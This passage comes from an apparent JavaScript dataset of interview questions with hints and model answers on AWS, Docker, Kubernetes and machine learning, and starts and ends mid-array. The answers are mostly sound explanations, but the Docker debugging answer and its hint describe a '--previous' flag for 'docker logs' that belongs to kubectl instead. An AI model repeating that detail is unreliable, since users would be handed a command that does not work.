      { q:'What is the difference between horizontal and vertical scaling, and what AWS services support each?', hint:'Vertical: larger instance (limited). Horizontal: Auto Scaling Groups, ELB. Most cloud-native architectures prefer horizontal.', answer:`Vertical scaling means giving a single server more resources - a larger instance type. It is simple to implement but has a hard ceiling (the largest instance size), requires downtime in some cases, and becomes expensive quickly. Horizontal scaling means adding more servers and distributing traffic across them, which is theoretically unlimited and more resilient. AWS Auto Scaling Groups automatically add or remove EC2 instances based on metrics like CPU or request count. Elastic Load Balancer distributes traffic across healthy instances. For Lambda, horizontal scaling is automatic and invisible - AWS runs as many concurrent invocations as needed. The key prerequisite for horizontal scaling is a stateless application - sessions must live in Redis or DynamoDB, files in S3, not on local disk. I design applications to be horizontally scalable from the start, which also improves availability since no single server failure affects the whole system.` },
      { q:'How do you secure an AWS environment? What are the key security services and practices?', hint:'IAM least privilege, Security Groups, NACLs, VPC isolation, CloudTrail, GuardDuty, Secrets Manager, KMS encryption.', answer:`I approach AWS security in layers. Identity and access: IAM roles with least-privilege policies, no long-lived access keys, MFA for console access, service-specific roles rather than overly permissive instance profiles. Network: VPCs to isolate environments, private subnets for databases and internal services, Security Groups as stateful instance-level firewalls, NACLs for subnet-level rules. Data protection: KMS encryption at rest for S3, RDS, EBS, and Secrets Manager for credentials - never hardcoded environment variables. Audit and detection: CloudTrail logs all API calls, GuardDuty does threat detection using ML on CloudTrail and VPC flow logs, Config tracks resource configuration changes. Vulnerability management: regular AMI patching, ECR scanning for container images, Inspector for EC2 vulnerabilities. I also tag all resources for cost and audit visibility, and use separate AWS accounts per environment to provide blast-radius containment.` },
      { q:'Explain the differences between SQS, SNS, and EventBridge.', hint:'SQS: queue (point-to-point, at-least-once). SNS: pub/sub fan-out. EventBridge: event bus with routing rules, third-party integrations.', answer:`SQS is a durable message queue for decoupling services point-to-point. A producer sends a message; one consumer processes it and deletes it. It guarantees at-least-once delivery and persists messages for up to 14 days, making it excellent for work queues where each message needs to be processed exactly once - order processing, email sending, background jobs. SNS is a pub/sub fanout service: one message published to a topic is delivered simultaneously to all subscribers - Lambda functions, SQS queues, HTTP endpoints, email. I use SNS when the same event needs to trigger multiple downstream systems. EventBridge is a more sophisticated event bus: it routes events based on JSON content rules, supports scheduled events, and integrates with over 90 AWS services and third-party SaaS providers out of the box. I use it for event-driven architectures where routing logic is complex or events come from multiple sources. A common pattern is SNS for simple fanout and EventBridge for content-based routing.` },
      { q:'Explain S3 storage classes and how lifecycle policies reduce costs.', hint:'Standard, Standard-IA, Intelligent-Tiering, Glacier Instant, Glacier Flexible, Deep Archive. Lifecycle rules automate transitions. Retrieval fees on IA/Glacier.', answer:`S3 Standard is for frequently accessed data - low latency, no retrieval fee. Standard-IA is cheaper storage but charges a per-GB retrieval fee, right for data accessed less than monthly. Intelligent-Tiering automatically moves objects between access tiers based on actual usage, eliminating manual tiering decisions at a small monitoring fee per object. Glacier Instant Retrieval offers millisecond access at lower cost for quarterly-access archives. Glacier Flexible Retrieval takes 1-12 hours and suits disaster recovery archives. Glacier Deep Archive is the cheapest class, with 12-hour retrieval, for long-term compliance storage. S3 lifecycle policies automate transitions and expirations: I configure access logs to move to Standard-IA after 30 days, Glacier after 90 days, and expire after 365 days. This runs automatically without any manual intervention and substantially reduces storage costs. Intelligent-Tiering is my default for objects with unpredictable access patterns.` },
      { q:'Compare RDS, Aurora, and DynamoDB - when do you choose each?', hint:'RDS: managed relational, Multi-AZ failover. Aurora: cloud-native, 5x MySQL perf, distributed storage. DynamoDB: NoSQL, single-digit ms, auto-sharding, known access patterns.', answer:`RDS manages relational databases (PostgreSQL, MySQL, SQL Server) with automated backups, patching, and Multi-AZ failover. It is the right lift-and-shift choice for relational workloads moving to AWS. Aurora is AWS's cloud-optimised relational engine, compatible with MySQL and PostgreSQL but with a distributed storage layer across six nodes in three AZs - delivering up to 5x MySQL performance and failover in under 30 seconds. Aurora Serverless v2 scales capacity automatically, ideal for variable workloads. DynamoDB is a fully managed NoSQL key-value and document database: single-digit millisecond latency at any scale, automatic sharding, and optional global tables for multi-region active-active setups. I choose RDS or Aurora when the workload is relational, needs ACID transactions and complex joins. I choose DynamoDB for high-throughput, low-latency workloads with predictable access patterns that can be modelled as key-value lookups - sessions, user preferences, gaming, IoT sensor data.` },
      { q:'Compare CloudFormation, CDK, and Terraform for infrastructure as code on AWS.', hint:'CloudFormation: AWS native JSON/YAML. CDK: TypeScript/Python generates CloudFormation - type-safe. Terraform: multi-cloud HCL, plan/apply. CDK for AWS-only; Terraform for multi-cloud or mixed teams.', answer:`CloudFormation is AWS's native IaC service using JSON or YAML templates. Every AWS resource supports it and new features arrive there first. The CDK generates CloudFormation from TypeScript, Python, Java, or C# - I get type checking, loops, conditionals, and reusable higher-level constructs that abstract common patterns. CDK is dramatically more ergonomic than raw YAML and my preference for AWS-only projects. Terraform by HashiCorp uses HCL and supports AWS, GCP, Azure, and hundreds of providers in one unified workflow. Terraform's plan/apply cycle shows exactly what will change before applying, and its state file tracks resource lifecycles. It is the right choice for multi-cloud organisations or teams standardising across providers. All three share the same principle: infrastructure changes are code-reviewed in pull requests and applied through CI/CD - the AWS console is never used to make production changes.` },
      { q:'Explain AWS VPC architecture: subnets, routing, security groups, and NAT gateways.', hint:'Public subnets -> Internet Gateway. Private subnets -> NAT Gateway for outbound. Isolated subnets for databases. Security Groups: stateful, instance-level. One NAT per AZ for HA. Transit Gateway for multi-VPC.', answer:`A VPC is an isolated network where I control IP ranges, subnets, routing, and firewall rules. A standard production architecture uses three tiers of subnets per AZ: public subnets for load balancers and NAT gateways (route 0.0.0.0/0 to Internet Gateway), private subnets for application servers (route 0.0.0.0/0 to NAT Gateway for outbound internet access without public IPs), and isolated database subnets with no route to the internet. Security Groups are stateful instance-level firewalls - I define minimum inbound rules: app servers accept only 443 from the load balancer security group, databases accept only 5432 from the app server security group. NACLs provide stateless subnet-level rules as an additional layer. One NAT Gateway per AZ is required for high availability - a single NAT Gateway is a single point of failure. Transit Gateway connects multiple VPCs and on-premises networks in a hub-and-spoke topology without requiring a full mesh of VPC peering connections.` },
      { q:'How does AWS Lambda work? Explain cold starts and how to minimise them.', hint:'Event-driven, no servers. Cold start on first invocation: container init takes 100ms-3s. Minimise: small packages, init outside handler, Provisioned Concurrency. Concurrency limits per region.', answer:`Lambda executes code in response to events without managing servers. On the first invocation (or after inactivity), AWS provisions a micro-VM and container - the cold start - before running the handler. This takes 100ms for Node.js/Python to 3+ seconds for Java with a large classpath. Subsequent invocations reuse the warm container in milliseconds. To minimise cold starts: keep deployment packages small (exclude dev dependencies), move initialisation code - database connections, SDK clients - outside the handler function to module level so it runs once per container lifetime, and use runtimes with faster startup. Provisioned Concurrency pre-warms a set number of Lambda instances, eliminating cold starts entirely for latency-sensitive paths. Lambda's concurrency limit (1,000 per region per account by default) is a critical throttle - at high traffic, functions throttle if concurrency is exhausted. I use reserved concurrency to guarantee capacity for critical functions and prevent a bursty function from starving others.` },
      { q:'What are your AWS cost optimisation strategies?', hint:'Right-sizing via CloudWatch metrics. Reserved Instances/Savings Plans: 30-72% off. Spot Instances: 90% off for fault-tolerant workloads. S3 lifecycle policies. Auto Scaling down during off-peak. Cost Explorer + alerts.', answer:`Cost optimisation starts with visibility: Cost Explorer shows spending by service and tag. I tag every resource with team and environment to enable per-team cost attribution. Right-sizing is highest-leverage: CloudWatch shows actual CPU, memory, and network utilisation - I regularly replace overprovisioned instances with the correct size, which alone cuts costs 30-50%. Reserved Instances and Savings Plans provide 30-72% discounts for committing to 1 or 3 years on predictable baseline workloads; Compute Savings Plans cover EC2, Lambda, and Fargate flexibly. Spot Instances offer up to 90% discount for fault-tolerant, interruptible workloads: batch processing, ML training, and CI/CD build fleets. Auto Scaling scales down during off-peak hours, eliminating idle capacity. S3 lifecycle policies move infrequent data to cheaper storage classes automatically. I regularly audit idle resources - unattached EBS volumes, stopped EC2 instances, unused Elastic IPs, old snapshots - and use billing alarms in CloudWatch to notify immediately when costs spike.` },
    ],
    docker: [
      { q:'Explain the difference between a Docker image and a Docker container.', hint:'Image: immutable blueprint (layers). Container: running instance of an image. Multiple containers from one image.', answer:`A Docker image is an immutable, layered filesystem snapshot - a blueprint that defines everything needed to run an application: the OS base, dependencies, application code, and the default command to run. Images are built from a Dockerfile and stored in registries. Each instruction in the Dockerfile creates a new read-only layer; Docker caches these layers, so unchanged layers are reused in subsequent builds. A container is a running instance of an image - it is the image plus a thin writable layer for any filesystem changes made during runtime. Multiple containers can run from the same image simultaneously, each with its own isolated process space, network, and writable layer. Stopping a container preserves its writable layer; removing it discards those changes. This is why application data that must persist across container restarts needs to be stored in a volume or mounted filesystem outside the container.` },
      { q:'What is a multi-stage Docker build and why would you use one?', hint:'Separate build and runtime stages. Build stage has compilers/tools; final stage copies only the artifact - smaller, more secure images.', answer:`A multi-stage build uses multiple FROM instructions in a single Dockerfile, each defining a separate stage. The first stage contains all the build tooling - compilers, build dependencies, test runners - that you need to compile the application. The final stage starts from a minimal base image and copies only the compiled artifact from the build stage, leaving all build tools behind. This produces dramatically smaller images: a Node.js application compiled in a node:20 build stage might have a final image based on node:20-alpine that is 60-80% smaller. Smaller images mean faster pulls, less attack surface - no build tools like gcc or npm that attackers could abuse - and lower storage costs. I use multi-stage builds for every production image: compile in a full SDK image, run in the smallest image that includes only the runtime. For static sites, the final stage can even be nginx:alpine with no Node.js at all.` },
      { q:'How do Docker volumes differ from bind mounts, and when do you use each?', hint:'Volumes: managed by Docker, portable, better for production. Bind mounts: map host path, great for dev with live-reload.', answer:`Docker volumes are managed by Docker itself - Docker handles where the data lives on the host, creates the directory, and manages lifecycle. They are portable: you can name them, back them up, share them between containers, and migrate them. For production, volumes are the correct choice for database data directories, upload storage, and any state that must survive container restarts. Bind mounts map a specific host filesystem path directly into a container. The container sees changes to host files immediately and vice versa. This is why bind mounts are the standard approach for local development: I mount my source code directory into the container so that any code change is immediately reflected inside without rebuilding the image. The tradeoff is that bind mounts are tied to the host path structure, making them non-portable across environments. In production I use volumes; in development Dockerfiles and compose files I use bind mounts for the source code.` },
      { q:'How do you use Docker Compose for local development? What are best practices?', hint:'docker-compose.yml defines services, networks, volumes. depends_on with health check for startup ordering. Override file for dev customisations. Single docker compose up starts the full stack.', answer:`Docker Compose defines a multi-container application in a single YAML file. Each service specifies its image or build context, environment variables, port mappings, volumes, and dependencies. A single docker compose up starts the entire local stack - application, database, Redis, any third-party dependencies - networking them in a private bridge network where services reach each other by name. The depends_on field with condition: service_healthy ensures the application does not start until the database passes its health check, preventing connection-refused errors on startup. The override pattern (docker-compose.override.yml) provides development-only customisations layered on top of a shared base file: bind mounts for live code reload in development, while the base file uses built images for CI and production. I define a healthcheck for every service so depends_on conditions work reliably. Compose variables files (.env) set environment-specific values without hardcoding them in the YAML. After the stack is up, docker compose logs -f tails all service logs in one terminal, and docker compose ps shows service health at a glance.` },
      { q:'What Docker networking modes exist, and when do you use each?', hint:'Bridge (default): private network, DNS by name. Host: shares host network, no isolation. None: no network. Overlay: multi-host Swarm. Macvlan: container appears as physical device.', answer:`Docker provides several networking modes. Bridge is the default - containers get a private IP on a virtual bridge network. In user-defined bridge networks (best practice), containers reach each other by service name via Docker's embedded DNS resolver. Traffic to the host is NATed. This is the right mode for isolated multi-container applications. Host mode shares the host's network namespace directly - the container uses the host's IP and ports with no NAT overhead. Useful for performance-critical networking or when the application binds to specific host ports without mapping, but it eliminates container network isolation. None mode gives the container no network access - suitable for containers that only process data from volumes with no network requirements. Overlay networks span multiple Docker hosts in a Swarm cluster, enabling cross-host container communication. Macvlan assigns a MAC address to the container, making it appear as a physical device on the network - used for legacy applications that must be directly on the LAN. I use user-defined bridge networks as the default for all Compose applications, with explicit port mapping only for externally reachable services.` },
      { q:'How do you optimise Docker layer caching to speed up builds?', hint:'Order instructions: slow/rarely changing first (dependencies), fast/frequently changing last (source code). COPY requirements.txt first, pip install, then COPY source. .dockerignore reduces context.', answer:`Docker caches each instruction as a layer - if the instruction and its inputs are unchanged, the cached layer is reused. The key is instruction ordering: put slow, rarely changing instructions early and fast, frequently changing instructions late. For a Node.js app: first COPY package.json and package-lock.json, then RUN npm ci, then COPY the rest of the source code. This way, the expensive npm install layer is cached as long as the package files have not changed - only source code edits trigger a rebuild from the COPY source step. For Python: COPY requirements.txt, RUN pip install -r requirements.txt, then COPY source. Always pin exact base image tags (node:20.11-alpine3.19) for reproducible builds - node:latest changes unpredictably and invalidates the cache. The .dockerignore file excludes files from the build context: node_modules, .git, test fixtures, documentation, and environment files. A large build context slows build startup and causes unnecessary cache invalidation when excluded-by-intent files change.` },
      { q:'What Docker security best practices do you follow in production images?', hint:'Non-root USER. Minimal base images (Alpine, distroless). Scan with Trivy/Snyk. Read-only filesystem. No secrets in layers or env vars. Docker Content Trust for image signing.', answer:`Container security starts with the base image: use minimal images like Alpine or distroless that have a small attack surface - no package manager, no shell in distroless, no unnecessary system utilities. Scan images for known CVEs with Trivy, Snyk, or docker scout as part of the CI pipeline so vulnerabilities are caught before deployment. Always run containers as a non-root user: add USER appuser in the Dockerfile - a container running as root that escapes the namespace has host root access. Never store secrets in environment variables baked into the image or in image layers (RUN export KEY=value leaves the key in layer history). Use Docker Secrets for Swarm, Kubernetes Secrets, or a secrets manager mounted at runtime. Mount the filesystem as read-only where possible (docker run --read-only) and use tmpfs for temporary writes. Avoid --privileged containers - they bypass all Docker security controls. Enable Docker Content Trust (DOCKER_CONTENT_TRUST=1) to sign and verify images, preventing use of tampered images.` },
      { q:'How do you implement Docker health checks and why do they matter?', hint:'HEALTHCHECK CMD in Dockerfile: --interval, --timeout, --start-period, --retries. States: starting -> healthy/unhealthy. Compose depends_on uses them. Kubernetes uses readinessProbe + livenessProbe separately.', answer:`A Docker health check defines a command Docker runs inside the container periodically to assess its health. Dockerfile syntax: HEALTHCHECK --interval=30s --timeout=3s --start-period=60s --retries=3 CMD curl -f http://localhost:8080/health || exit 1. The container progresses through states: starting (health failures ignored during start-period while the app initialises), healthy (check passes), and unhealthy (check has failed retries times consecutively). Docker does not automatically restart unhealthy containers - orchestrators do that. In Docker Compose, depends_on: service: condition: service_healthy blocks dependent services from starting until the health check passes, solving the "app starts before database is ready" race condition. In Kubernetes, I use readinessProbe (is the app ready to accept traffic?) and livenessProbe (should the container be restarted?) separately, as they serve different purposes. A good health check endpoint tests actual service readiness - queries the database, checks dependencies - not just that the HTTP port is open.` },
      { q:'How do you debug a running or crashing Docker container?', hint:'docker logs container --tail 50. docker exec -it container sh for shell. docker inspect for config. docker stats for resource usage. --previous flag for logs of crashed container. Ephemeral debug container.', answer:`When a container is misbehaving, docker logs container_name is the first command - it shows stdout/stderr output. docker logs container_name --tail 100 shows the last 100 lines; docker logs container_name --since 5m shows the last 5 minutes. For a crashed container, docker logs --previous shows logs from the previous run before it crashed. For interactive debugging of a running container, docker exec -it container_name sh (or bash) opens a shell to inspect environment variables, test network connectivity, check running processes, and read log files. docker inspect container_name outputs the full container configuration as JSON - environment variables, volume mounts, network settings - useful for verifying the container was started with the expected configuration. docker stats shows live CPU, memory, and network utilisation per container for resource debugging. For containers that crash too fast to exec into, change the Dockerfile's CMD to tail -f /dev/null temporarily to keep it running, then exec in to diagnose why the real entrypoint is failing.` },
    ],
    kubernetes: [
      { q:'Explain the difference between a Deployment, StatefulSet, and DaemonSet in Kubernetes.', hint:'Deployment: stateless apps, rolling updates. StatefulSet: stateful apps, stable network identity. DaemonSet: one pod per node (logging, monitoring).', answer:`A Deployment manages a set of identical, interchangeable pods for stateless applications. It handles rolling updates - gradually replacing old pods with new ones - and rollbacks. Since the pods are interchangeable, Kubernetes can schedule them anywhere and restart them on any node without concern for identity. A StatefulSet is for applications that require persistent identity: each pod gets a stable, ordered name (pod-0, pod-1), a stable network identity, and its own persistent volume that follows it through rescheduling. This is what databases like PostgreSQL and Cassandra require - they need to know which node is which and where their data lives. A DaemonSet ensures exactly one pod runs on every node (or a specified subset). I use DaemonSets for cluster-wide infrastructure: log collectors like Fluentd, metrics agents like Prometheus node-exporter, security scanners, and network plugins - anything where every node needs the same workload.` },
      { q:'How does Kubernetes handle service discovery and load balancing?', hint:'Services (ClusterIP, NodePort, LoadBalancer) abstract pods. kube-proxy manages iptables. CoreDNS for DNS-based discovery.', answer:`Kubernetes Services provide a stable virtual IP and DNS name for a set of pods, decoupling consumers from the dynamic pod IP addresses that change as pods restart. kube-proxy on each node maintains iptables rules that intercept traffic to the Service IP and round-robin it across healthy backend pods. CoreDNS runs in the cluster and resolves service names to their virtual IPs, so a pod can reach another service simply by calling its service name as a hostname. ClusterIP is the default - only reachable within the cluster. NodePort exposes the service on a static port on every node's IP, useful for external access in development. LoadBalancer provisions a cloud provider load balancer - an AWS ALB or GCP Load Balancer - that forwards external traffic to the Service. For production HTTP traffic I use an Ingress controller, which provides a single external entry point with host and path-based routing to multiple Services within the cluster.` },
      { q:'What is the difference between a ConfigMap and a Secret in Kubernetes?', hint:'ConfigMap: non-sensitive config. Secret: base64-encoded sensitive data. In practice, use external secret managers (Vault, AWS Secrets Manager).', answer:`ConfigMaps store non-sensitive configuration data as key-value pairs - feature flags, application config files, environment-specific settings. They can be mounted as files or injected as environment variables into pods. Secrets are designed for sensitive data like passwords, API keys, and certificates. The critical caveat is that Kubernetes Secrets are only base64-encoded by default - not encrypted. Anyone with access to the etcd datastore or the right RBAC permissions can read them in plaintext. For production I treat Kubernetes Secrets as a last resort and instead use external secret management: AWS Secrets Manager or HashiCorp Vault with the External Secrets Operator, which syncs secrets from the external store into Kubernetes Secrets automatically while keeping the source of truth encrypted and audited outside the cluster. I also enable encryption at rest for etcd and apply strict RBAC to limit who can read Secret objects.` },
      { q:'How do Kubernetes resource requests and limits work? What is QoS class?', hint:'Requests: scheduler uses for placement. Limits: hard cap (CPU throttled, memory OOMKilled). Guaranteed QoS = requests equals limits. Burstable QoS = requests < limits. BestEffort = no requests.', answer:`Resource requests tell the Kubernetes scheduler how much CPU and memory a container needs - it only places the pod on a node that has at least that much unallocated capacity. Limits cap what the container can actually use at runtime. Exceeding the CPU limit causes throttling (the process is slowed). Exceeding the memory limit causes the container to be OOMKilled and restarted. QoS class is derived from these settings. Guaranteed: both requests and limits are set and equal - the pod is the last to be evicted under node pressure, with the most predictable performance. Burstable: requests are set but lower than limits - the pod can burst but may be evicted if the node is under memory pressure. BestEffort: no requests or limits set - first to be evicted, never use for production workloads. I always set resource requests based on profiling data from a staging environment. Omitting requests makes pods unschedulable on constrained clusters and gives the scheduler no basis for intelligent placement.` },
      { q:'How does Horizontal Pod Autoscaling work in Kubernetes?', hint:'HPA watches metrics (CPU %, custom via Prometheus). Scales replicas up/down toward target utilisation. minReplicas, maxReplicas. Stabilisation window prevents flapping. Scale on queue depth for async workloads.', answer:`The HorizontalPodAutoscaler periodically queries the metrics server for average CPU (or custom metrics) across all pods in a deployment and adjusts replica count to maintain a target utilisation. If average CPU is 80% against a target of 50%, the HPA calculates more replicas are needed and scales up. The stabilisation window (default 5 minutes for scale-down) prevents flapping - the HPA will not scale down immediately after a burst, waiting to confirm the load is genuinely lower. minReplicas ensures the service is never scaled to zero (preventing cold starts on traffic arrival), and maxReplicas caps growth. For CPU-bound services, HPA on CPU utilisation works well. For latency-sensitive services, I configure custom metrics via the Prometheus Adapter: scaling on HTTP request rate or response time gives faster, more accurate scaling than CPU which lags behind load. For queue-based workers, KEDA (Kubernetes Event-Driven Autoscaling) scales based on queue depth - zero replicas when the queue is empty, scaling up as messages accumulate.` },
      { q:'Explain Kubernetes networking: how do pods communicate and what are Network Policies?', hint:'Every pod gets unique IP. Pods communicate directly - no NAT within cluster. CNI plugin implements this. Network Policies: deny-all default, then explicit allows. Service mesh (Istio) for mTLS.', answer:`Kubernetes networking follows three rules: every pod gets a unique IP, pods communicate with each other directly without NAT, and agents on a node can reach all pods on that node. The CNI (Container Network Interface) plugin implements this - popular choices include Calico, Cilium, Flannel, and AWS VPC CNI (which assigns VPC IPs to pods). By default, all pods can talk to all other pods - there is no network isolation. Network Policies are Kubernetes objects that restrict pod-to-pod traffic using label selectors: a deny-all ingress policy blocks all inbound traffic to a namespace, then explicit allow policies open specific paths. I apply a default-deny NetworkPolicy to every namespace from day one - retrofitting isolation onto an existing cluster is significantly harder. Ingress controllers (nginx-ingress, Traefik, AWS ALB) handle external HTTP traffic with TLS termination and path-based routing. A service mesh like Istio adds mutual TLS between all services automatically, fine-grained traffic policies, and distributed tracing without application-level changes.` },
      { q:'What is Helm and how do you structure charts for a production application?', hint:'Helm: Kubernetes package manager. Chart: templates + values.yaml. helm install/upgrade/rollback. values-dev.yaml, values-prod.yaml for environments. Artifact Hub for community charts.', answer:`Helm is the package manager for Kubernetes. A chart is a collection of YAML templates parameterised with Go template syntax and a values.yaml providing defaults. Instead of maintaining separate Kubernetes manifests per environment, I write templates using {{ .Values.replicaCount }}, {{ .Values.image.tag }}, and similar, then provide environment-specific values files that override defaults. helm install deploys the chart; helm upgrade updates it with a new values file or chart version; helm rollback reverts to a previous release - critical for quick recovery from bad deployments. For production applications, I maintain one chart per service in a helm/ directory within the service repository, with CI rendering and applying it on every merge to main. Artifact Hub provides community charts for common infrastructure: I use the community PostgreSQL, Redis, and Prometheus charts with custom values rather than writing my own Kubernetes manifests for these, reducing maintenance burden. Chart versioning and release tracking mean I always know exactly what version is deployed in each environment.` },
      { q:'Explain Kubernetes RBAC - how do you control who can do what in the cluster?', hint:'Role + ClusterRole define permissions. RoleBinding + ClusterRoleBinding grant them. ServiceAccount for pod identity. Least privilege. Audit regularly with kubectl auth can-i.', answer:`Kubernetes RBAC uses four object types. Role defines permissions within a namespace - which verbs (get, list, create, update, delete) on which resources (pods, deployments, services). ClusterRole defines permissions cluster-wide. RoleBinding grants a Role to a user, group, or ServiceAccount within a namespace. ClusterRoleBinding grants a ClusterRole cluster-wide. ServiceAccounts are identities for pods - every pod runs as a ServiceAccount and can be granted specific permissions via RoleBindings. I apply least privilege rigorously: a typical microservice's ServiceAccount has no permissions at all within the cluster. A CI/CD system deploying to the cluster needs create, update, and delete on Deployment, Service, ConfigMap, and Secret in its namespace - nothing else. I regularly audit RBAC with kubectl auth can-i to verify effective permissions, and check for wildcard permissions (verb: "*") which are almost always overly broad. Cluster-admin bindings are strictly limited to the ops team and every use is logged via audit logs. External Secrets Operator reduces the need for pods to read Secrets directly.` },
      { q:'How do Persistent Volumes and StorageClasses work in Kubernetes?', hint:'StorageClass defines provisioner. PVC requests storage. Dynamic provisioning creates PV automatically. StatefulSet uses volumeClaimTemplates. ReadWriteOnce vs ReadWriteMany. Retain policy prevents data loss.', answer:`Kubernetes separates storage definition from storage consumption. StorageClasses define the type of storage available and how to provision it - an AWS gp3 EBS StorageClass, an Azure Managed Disk class, or an NFS class. PersistentVolumeClaims (PVCs) are requests by pods for storage: specify the size, access mode, and StorageClass. Dynamic provisioning means the CSI driver automatically creates a PersistentVolume and the underlying disk when a PVC is created, eliminating manual volume management. StatefulSets use volumeClaimTemplates to automatically create a dedicated PVC per pod replica - pod-0 gets its own volume, pod-1 gets its own, providing stable, persistent storage that follows each pod through rescheduling. Access modes matter: ReadWriteOnce (one node at a time, standard for block storage) versus ReadWriteMany (concurrent access from multiple nodes, requires NFS or AWS EFS). The reclaim policy controls what happens when a PVC is deleted: Delete removes the underlying storage automatically (appropriate for ephemeral workloads), Retain keeps it for manual recovery (appropriate for databases). I always use Retain for database volumes to prevent accidental data loss.` },
      { q:'How do you diagnose a pod in CrashLoopBackOff or Pending state?', hint:'kubectl describe pod: Events section shows reason. CrashLoopBackOff -> kubectl logs --previous. OOMKilled -> increase memory limit. Pending -> resource constraints or node selector. kubectl top pod for live usage.', answer:`Systematic diagnosis starts with kubectl describe pod pod-name - the Events section at the bottom explains most issues. For CrashLoopBackOff, the container is starting and immediately crashing: kubectl logs pod-name --previous shows the logs from the crashed container (the current logs are empty because the new container is still starting). Common causes: application startup exception, missing environment variable, or failed database connection. OOMKilled means the container exceeded its memory limit - check the exit code in describe (137 indicates OOMKill), then increase the memory limit or fix the memory leak, using kubectl top pod to see current usage. ImagePullBackOff means the image cannot be pulled - verify the image name, tag, registry authentication, and imagePullSecrets. Pending means the pod cannot be scheduled: insufficient cpu or memory on any node (increase node size or count), node affinity or toleration mismatch (check nodeSelector and tolerations), or PVC not bound (check PersistentVolumeClaim status). For a running but misbehaving pod, kubectl exec -it pod-name -- sh opens an interactive shell. kubectl debug creates an ephemeral container for debugging pods with no shell.` },
    ],
    'machine learning': [
      { q:'Explain the bias-variance tradeoff and how it relates to model selection.', hint:'High bias: underfitting (too simple). High variance: overfitting (too complex). Goal: find sweet spot - regularisation, cross-validation help.', answer:`Bias measures how far a model's average prediction is from the true value - a high-bias model makes strong, incorrect assumptions and underfits, missing patterns even in training data. Variance measures how much predictions fluctuate across different training sets - a high-variance model fits training data very closely but fails to generalise to new data. The tradeoff is that reducing one tends to increase the other. A simple linear model has high bias and low variance; a deep decision tree has low bias and high variance. I navigate this by using cross-validation to estimate both: if training and validation error are both high, I need a more complex model or better features. If training error is low but validation error is high, I need regularisation - L1/L2 penalties, dropout for neural networks, limiting tree depth. I pick the model complexity that minimises validation error, not training error.` },
      { q:'What is the difference between supervised, unsupervised, and reinforcement learning?', hint:'Supervised: labelled data, predict output. Unsupervised: find patterns in unlabelled data. RL: agent learns via reward/punishment.', answer:`Supervised learning trains on labelled examples - input paired with the correct output. The model learns a mapping from input to output that it can apply to new inputs. Classification and regression are both supervised. Unsupervised learning works on unlabelled data, finding structure the data itself reveals - clustering groups similar data points together, dimensionality reduction compresses high-dimensional data while preserving relationships, anomaly detection identifies points that do not fit the learned distribution. Reinforcement learning trains an agent to make sequential decisions in an environment by rewarding or penalising actions based on outcomes, without explicit labelling - the agent explores and learns policies through trial and error. In practice, supervised learning is the most common in production systems because labelled data is accessible and the objective is clear. Unsupervised techniques are valuable for data exploration, feature engineering, and recommendation systems.` },
      { q:'How do you handle class imbalance in a classification problem?', hint:'Resampling (SMOTE, undersampling), class weights in loss function, threshold tuning, ensemble methods (EasyEnsemble).', answer:`Class imbalance causes a model to achieve high accuracy by ignoring the minority class entirely - predicting the majority class every time. My first step is to understand whether the imbalance is a problem for the business: for fraud detection, missing 40% of fraud cases is catastrophic even if overall accuracy is 99%. From there I use several techniques depending on severity. Class weights in the loss function penalise misclassifying the minority class more heavily - most frameworks support this natively. Oversampling with SMOTE generates synthetic minority samples by interpolating between existing ones, avoiding exact duplication. Undersampling reduces the majority class, which is faster but discards data. At the evaluation stage, I use precision, recall, F1-score, and AUC-ROC rather than accuracy - accuracy is misleading on imbalanced data. Finally, I tune the classification threshold based on the business cost of false positives vs false negatives rather than defaulting to 0.5.` },
      { q:'Explain gradient descent and its variants - SGD, Mini-batch, Adam.', hint:'SGD: one sample, noisy. Mini-batch: balance of noise and efficiency. Adam: adaptive learning rates per parameter, momentum - most popular.', answer:`Gradient descent minimises the loss function by iteratively moving model parameters in the direction of the negative gradient. Pure batch gradient descent computes the gradient over the entire training set - precise but slow and memory-intensive. SGD computes the gradient on a single random sample per update - fast but very noisy, causing the loss to fluctuate. Mini-batch gradient descent is the standard compromise: compute gradients on a small batch (typically 32-256 samples), which is computationally efficient on GPUs and introduces enough noise to escape shallow local minima. Adam - Adaptive Moment Estimation - is the most widely used optimizer in deep learning. It maintains a moving average of both the gradient (momentum) and the squared gradient (adaptive learning rate), effectively giving each parameter its own learning rate that scales down for frequently updated parameters and up for infrequent ones. This makes Adam robust to hyperparameter choices and faster to converge than vanilla SGD in most tasks.` },
      { q:'How do you evaluate a machine learning model beyond accuracy?', hint:'Precision, recall, F1, AUC-ROC for classification. MAE, RMSE, R² for regression. Always consider business cost of false positives vs negatives.', answer:`Accuracy is the fraction of correct predictions - a useful starting point but often misleading on imbalanced datasets or when the cost of different error types varies. For classification, I evaluate precision - of all positive predictions, how many were correct - and recall - of all actual positives, how many did the model catch. F1-score is their harmonic mean, balancing both. AUC-ROC measures the model's ability to discriminate between classes across all possible thresholds, giving a threshold-independent view of performance. For binary outcomes with high cost asymmetry, like fraud or medical diagnosis, I frame evaluation explicitly in business terms: what is the cost of a false positive versus a false negative, and what threshold minimises that total cost? For regression, MAE gives the average absolute error in interpretable units, RMSE penalises large errors more heavily, and R² shows how much variance the model explains. I always evaluate on a held-out test set, never on training data.` },
      { q:'What feature engineering techniques do you use, and why does feature engineering matter more than model choice?', hint:'Numerical: scaling, log transform. Categorical: one-hot, target encoding. Temporal: day-of-week, time-since. Interactions. Feature selection to remove noise. Better features beat better models.', answer:`Feature engineering is often higher-leverage than algorithm selection - a well-engineered feature set with logistic regression frequently outperforms a raw dataset fed to a gradient boosting model. Numerical features: normalisation (scaling to 0-1) is needed for scale-sensitive algorithms like SVM, KNN, and neural networks; standardisation (zero mean, unit variance) suits linear models; log transform reduces skewness in right-skewed distributions, pulling outliers toward the mean. Categorical features: one-hot encoding for nominal categories with few values; target encoding replaces high-cardinality categories with their mean target value - more informative for tree models than thousands of one-hot columns; ordinal encoding when a natural order exists (low/medium/high). Temporal features: extracting day-of-week, hour-of-day, month, is_weekend, and time-since-last-event from timestamps captures periodic patterns that models cannot learn from raw timestamps. Interaction features multiply or combine two features to surface non-linear relationships for linear models. Feature selection removes redundant and noisy features, preventing overfitting and reducing training time.` },
